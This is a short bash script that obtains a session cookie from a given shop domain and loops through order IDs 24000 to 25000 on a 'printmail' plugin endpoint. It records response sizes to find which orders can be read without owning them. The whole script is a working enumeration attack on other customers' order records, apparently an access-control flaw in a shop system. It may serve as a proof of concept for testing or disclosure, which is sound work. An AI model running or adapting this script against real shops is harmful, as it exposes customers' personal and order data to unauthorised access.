#! /bin/bash
DOMAIN=$1
TEST_PATH="shop/de/sys/"
#TEST_PATH="shop/de/"
SAMPLE1_ID=0


COOKIE=$(curl -s -c - $DOMAIN | grep sessiontradepro | cut -f7)
echo "Got Cookie: $COOKIE"
SAMPLE1=$(curl -s -w '\nsize_download %{size_download}' "$DOMAIN/$TEST_PATH?plugin=printmail&wkid=$COOKIE&orderid=$SAMPLE1_ID" | grep size_download | cut -d" " -f2)
echo Test URL: "$DOMAIN/$TEST_PATH?plugin=printmail&wkid=$COOKIE&orderid=%ID%"
echo "========"
echo $SAMPLE1_ID $SAMPLE1
for SAMPLE2_ID in {24000..25000}
 do
   SAMPLE2=$(curl -s -w '\nsize_download %{size_download}' "$DOMAIN/$TEST_PATH?plugin=printmail&wkid=$COOKIE&orderid=$SAMPLE2_ID" | grep size_download | cut -d" " -f2)
   echo $SAMPLE2_ID $SAMPLE2
done
